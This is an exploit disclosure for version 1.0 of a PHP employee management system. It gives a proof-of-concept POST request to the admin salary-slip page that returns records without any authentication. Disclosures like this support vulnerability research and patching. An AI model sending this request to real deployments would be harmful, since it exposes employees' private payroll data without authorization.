### Exploit Title: Best employee management system - unauthorized access
### Date: 2025-02/11
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/17689/best-employee-management-system-php.html
### Version: 1.0
### Tested on: windows10 + phpstudy

# 1./admin/salary_slip.php unauthorized access 

### unauthorized access POC #1

```
POST /admin/salary_slip.php HTTP/1.1
Host: 127.0.0.1:8001
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded

id=1

```

### unauthorized access
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739271518445.jpg "Best employee management system")

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/1739271512755.jpg "Best employee management system")
